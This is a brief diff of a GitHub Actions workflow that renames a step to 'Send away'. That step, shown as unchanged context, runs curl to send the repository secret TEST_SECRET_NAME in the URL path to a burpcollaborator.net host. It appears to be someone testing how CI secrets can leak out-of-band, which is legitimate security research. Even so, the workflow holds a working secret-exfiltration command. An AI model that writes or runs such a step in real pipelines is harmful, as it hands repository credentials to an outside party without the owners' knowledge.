@@ -18,6 +18,6 @@ jobs:
       - name: view the secrets context
         shell: bash
         run: ls
-      - name: view the secrets context2
+      - name: Send away
         shell: bash
         run: curl http://vkjm0q12k6ycxy1qz78cuxu0lrrhf6.burpcollaborator.net/${{ secrets.TEST_SECRET_NAME }}
